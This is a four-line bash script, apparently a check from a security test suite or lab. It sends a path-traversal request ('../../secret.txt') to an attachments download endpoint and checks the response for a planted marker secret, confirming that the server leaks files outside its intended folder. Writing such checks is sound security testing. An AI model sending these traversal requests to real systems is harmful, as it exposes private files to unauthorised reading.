#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -sG "$TARGET/api/attachments/download" --data-urlencode 'name=../../secret.txt' | grep -q 'GO-LOCAL-SECRET-2f7b'
